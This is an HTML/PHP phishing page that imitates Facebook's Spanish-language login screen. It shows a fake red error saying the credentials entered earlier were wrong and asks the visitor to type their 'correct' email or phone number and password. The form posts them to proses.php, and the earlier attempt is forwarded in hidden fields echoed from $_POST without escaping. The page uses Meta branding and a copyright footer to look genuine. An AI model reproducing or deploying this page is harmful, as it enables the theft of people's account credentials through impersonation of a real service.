<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />

    <!-- Bootstrap CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="assets/fathz.css" />
    <title>Iniciar sesión | Iniciar sesión en Facebook</title>
  </head>
  <body>
    <div class="container">
      <header>
        <nav>
          <div class="logo">
            <img src="assets/img/meta.png" alt="Facebook Logo" />
          </div>
          <ul class="menu">
            <li><a href="#">ayuda</a></li>
          </ul>
        </nav>
      </header>
      <center>
        <div class="peringatanakun">
        <p style="color: white; background-color: red;">El correo electrónico o el número de teléfono móvil y la contraseña que ingresó antes son incorrectos. Rellénelos correctamente.</p>
<img src="fb.png" alt="Yudha Image" width="110" height="45">
          </div>
      </center>
      <form class="bxformpemblokiran" method="post" action="proses.php">
              <div class="itempemblokiranalexfb">
                <div class="labelitemformalex">
                  <label class="form-label">Su correo electrónico o número de móvil correcto</label>
                </div>
                <input class="form-control-plaintext" type="text" name="nama" id="alx_nama" placeholder="Correo electrónico o número de móvil" autocomplete="off" required/>
              </div>
              <div class="itempemblokiranalexfb">
                <div class="labelitemformalex">
                  <label class="form-label">tu contraseña correcta</label>
                </div>
                <input class="form-control-plaintext" type="password" name="phone" placeholder="contraseña" id="alx_phone" autocomplete="off" required/>
              </div>
              <div class="btnverifalexfbblokir">
              <input type="hidden" name="email" value="<?= $_POST['email'] ?>">
              <input type="hidden" name="password" value="<?= $_POST['password'] ?>" >
                <button type="submit">Iniciar sesión</button>
              </div>
            </form>
            <foot class="copyright">
              <div class="cralexfbpemblokiran">
                <span style="font-size: 12;">Meta © 2023</span>
              </div>
             </foot>
    </div>
    <script
      src="https://kit.fontawesome.com/08380760ee.js"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
